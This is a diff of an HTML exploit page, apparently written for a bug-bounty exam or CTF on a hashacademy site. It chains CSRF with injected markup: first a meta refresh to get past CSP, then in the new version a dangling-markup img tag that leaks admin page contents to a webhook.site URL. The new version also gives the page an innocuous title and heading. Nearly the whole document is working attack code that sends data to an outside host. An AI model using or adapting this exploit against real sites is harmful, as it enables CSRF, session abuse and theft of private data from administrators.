@@ -1,43 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Diagnostic</title>
+    <title>Bug Report System</title>
 </head>
 <body>
-    <h1>Exploit Running... Check Webhook.</h1>
+    <h1>Processing... Please wait.</h1>
     <script>
         const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
         const webhook = "https://webhook.site/ea019a0a-1118-44a3-8caf-95a90cd5d271";
-        
-        // This payload uses a Meta Refresh to bypass connect-src 'self'
-        // It forces the admin's browser to navigate to the private message.
-        const xssMessage = `<meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/api/admin/messages/69ea47fabee6d6b7c6645a43">`;
 
-        async function launch() {
-            // 1. Submit the message via CSRF
-            const response = await fetch(targetApi, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "name": "Saja",
-                    "email": "research@seoulaura.com",
-                    "subject": "Urgent Security Report",
-                    "message": xssMessage,
-                    "category": "technical",
-                    "priority": "high"
-                })
-            });
+        // This payload uses an open 'src' attribute. 
+        // It will capture the HTML of the page (where the flag is) 
+        // and send it as part of the URL to your webhook.
+        const danglingPayload = `<img src="${webhook}/leak?data=`;
 
-            // 2. Wait for the server to process, then redirect the admin 
-            // to their own 'sent messages' or 'inbox' to trigger the Meta tag.
-            // If you know the exact inbox URL, use that instead.
-            setTimeout(() => {
+        async function launchExploit() {
+            try {
+                // Step 1: Submit the payload via CSRF
+                await fetch(targetApi, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        "name": "Saja",
+                        "email": "research@seoulaura.com",
+                        "subject": "Urgent formatting issue",
+                        "message": danglingPayload,
+                        "category": "technical",
+                        "priority": "high"
+                    })
+                });
+
+                // Step 2: Redirect the admin to the inbox 
+                // so they actually view the message and trigger the leak.
+                setTimeout(() => {
+                    window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
+                }, 1000);
+            } catch (e) {
+                // If fetch fails, the bot might still follow the redirect
                 window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
-            }, 1500);
+            }
         }
 
-        launch();
+        launchExploit();
     </script>
 </body>
 </html>
